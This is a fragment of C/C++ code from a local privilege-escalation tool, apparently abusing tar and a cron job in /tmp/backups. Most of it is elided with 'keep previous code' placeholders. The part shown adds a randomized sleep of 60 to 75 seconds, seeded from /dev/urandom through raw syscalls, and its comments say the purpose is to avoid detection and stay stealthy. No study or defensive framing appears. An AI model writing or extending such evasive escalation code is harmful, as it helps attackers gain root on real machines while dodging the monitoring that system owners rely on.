// ... (keep all previous code until execute_tar_privesc function)

int execute_tar_privesc() {
    const char* backups_dir = "/tmp/backups";
    
    // ... (keep all file creation code the same)
    
    // ========================================================================
    // Step 6: Wait for cron job with RANDOMIZED timing
    // ========================================================================
    // Instead of fixed 65 seconds, use randomized delay to avoid detection
    
    unsigned int random_seed;
    
    // Get random seed from /dev/urandom (stealthy)
    int urandom_fd = syscall(SYS_open, "/dev/urandom", O_RDONLY);
    if (urandom_fd >= 0) {
        syscall(SYS_read, urandom_fd, &random_seed, sizeof(random_seed));
        syscall(SYS_close, urandom_fd);
    } else {
        // Fallback: use timestamp + PID
        struct timespec ts;
        syscall(SYS_clock_gettime, CLOCK_REALTIME, &ts);
        random_seed = ts.tv_nsec ^ syscall(SYS_getpid);
    }
    
    // Generate random delay between 60-75 seconds
    unsigned int random_delay = 60 + (random_seed % 16);
    
    struct timespec sleep_time;
    sleep_time.tv_sec = random_delay;
    sleep_time.tv_nsec = (random_seed >> 16) % 1000000000;  // Random nanoseconds
    
    syscall(SYS_nanosleep, &sleep_time, nullptr);
    
    return 0;
}
